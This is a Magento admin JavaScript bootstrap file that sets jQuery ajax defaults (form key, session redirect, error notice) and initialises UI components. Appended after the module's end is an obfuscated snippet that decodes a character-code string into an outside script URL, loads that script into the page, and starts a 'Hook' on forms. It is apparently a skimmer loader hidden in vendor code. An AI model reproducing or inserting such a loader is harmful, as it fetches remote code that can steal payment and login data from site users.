/**
 * Copyright © Magento, Inc. All rights reserved.
 * See COPYING.txt for license details.
 */

/* global FORM_KEY */
define([
    'jquery',
    'mage/apply/main',
    'mage/backend/notification',
    'Magento_Ui/js/lib/knockout/bootstrap',
    'mage/mage',
    'mage/translate'
], function ($, mage, notification) {
    'use strict';

    var bootstrap;

    $.ajaxSetup({
        /*
         * @type {string}
         */
        type: 'POST',

        /**
         * Ajax before send callback.
         *
         * @param {Object} jqXHR - The jQuery XMLHttpRequest object returned by $.ajax()
         * @param {Object} settings
         */
        beforeSend: function (jqXHR, settings) {
            var formKey = typeof FORM_KEY !== 'undefined' ? FORM_KEY : null;

            if (!settings.url.match(new RegExp('[?&]isAjax=true',''))) {
                settings.url = settings.url.match(
                    new RegExp('\\?', 'g')) ?
                    settings.url + '&isAjax=true' :
                    settings.url + '?isAjax=true';
            }

            if (!settings.data) {
                settings.data = {
                    'form_key': formKey
                };
            } else if (typeof settings.data === 'string' &&
                settings.data.indexOf('form_key=') === -1) {
                settings.data += '&' + $.param({
                    'form_key': formKey
                });
            } else if ($.isPlainObject(settings.data) && !settings.data['form_key']) {
                settings.data['form_key'] = formKey;
            }
        },

        /**
         * Ajax complete callback.
         *
         * @param {Object} jqXHR - The jQuery XMLHttpRequest object returned by $.ajax()
         */
        complete: function (jqXHR) {
            var jsonObject;

            if (jqXHR.readyState === 4) {
                try {
                    jsonObject = JSON.parse(jqXHR.responseText);

                    if (jsonObject.ajaxExpired && jsonObject.ajaxRedirect) { //eslint-disable-line max-depth
                        window.location.replace(jsonObject.ajaxRedirect);
                    }
                } catch (e) {}
            }
        },

        /**
         * Error callback.
         */
        error: function () {
            $('body').notification('clear')
                .notification('add', {
                    error: true,
                    message: $.mage.__(
                        'A technical problem with the server created an error. ' +
                        'Try again to continue what you were doing. If the problem persists, try again later.'
                    ),

                    /**
                     * @param {String} message
                     */
                    insertMethod: function (message) {
                        var $wrapper = $('<div></div>').html(message);

                        $('.page-main-actions').after($wrapper);
                    }
                });
        }
    });

    /**
     * Bootstrap application.
     */
    bootstrap = function () {
        /**
         * Init all components defined via data-mage-init attribute
         * and subscribe init action on contentUpdated event
         */
        mage.apply();

        /*
         * Initialization of notification widget
         */
        notification({}, $('body'));
    };

    $(bootstrap);
});

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b